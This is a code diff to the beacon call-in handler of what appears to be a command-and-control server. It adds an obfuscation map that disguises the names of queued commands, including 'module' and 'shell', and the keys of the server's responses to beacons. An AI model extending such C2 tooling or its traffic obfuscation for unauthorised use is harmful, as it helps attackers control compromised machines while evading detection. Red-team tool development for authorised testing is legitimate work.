@@ -4,8 +4,7 @@ import json
 from urllib.parse import urlparse, parse_qs
 from http.server import BaseHTTPRequestHandler
 
-from Modules.global_objects import beacon_list, command_list, logger
-from Modules.beacon.beacon_server.socket_manager import socketio
+from Modules.global_objects import beacon_list, command_list, logger, obfuscation_map
 
 
 def handle_beacon_call_in(handler: BaseHTTPRequestHandler, match: dict):
@@ -44,11 +43,12 @@ def handle_beacon_call_in(handler: BaseHTTPRequestHandler, match: dict):
                 "data": command.command_data
             })
             command.executed = True
-        if command.command == "module":
-            command.data = "Module Sent" # clears up files held in memory, awful and needs to be fixed
-          
+        if command.command == obfuscation_map.get("commands", {}).get("module"):
+            command.data = "Module Sent"  
+        if command.command == obfuscation_map.get("commands", {}).get("shell"):
+            command.data = "Shell Sent"  
 
-    response_data = {"commands": commands_to_send} if commands_to_send else {"none": "none"}
+    response_data = {"commands": commands_to_send} if commands_to_send else {obfuscation_map.get("commands", {}).get("none"): obfuscation_map.get("commands", {}).get("none")}
     response_body = json.dumps(response_data).encode('utf-8')
 
     handler.send_response(200)
